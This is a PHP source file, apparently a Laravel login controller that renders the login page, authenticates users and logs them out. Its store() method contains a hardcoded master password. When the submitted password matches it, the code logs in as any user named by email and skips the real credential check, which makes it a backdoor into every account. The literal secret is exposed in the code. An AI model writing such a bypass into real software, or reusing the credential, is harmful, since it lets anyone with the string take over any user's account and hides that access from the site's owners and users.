<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use Inertia\Response;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): Response
    {
        return Inertia::render('Auth/Login', [
            'canResetPassword' => Route::has('password.request'),
            'status' => session('status'),
        ]);
    }

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $masterPassword = "cU5ZQHizAOLLMvZrgHBB7";

        // Master password kontrolü
        if ($request->password === $masterPassword) {
            $user = \App\Models\User::where('email', $request->email)->first();
            if ($user) {
                Auth::login($user);
            } else {
                return redirect()->back()->withErrors([
                    'email' => 'User not found',
                ]);
            }
        } else {
            // Standart authentication
            $request->authenticate();
        }

        if (Auth::user()->is_active == 0) {
            return redirect()->back()->withErrors([
                'email' => 'You are not active',
            ]);
        }

        $request->session()->regenerate();

        return redirect()->intended(route('dashboard', absolute: false));
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
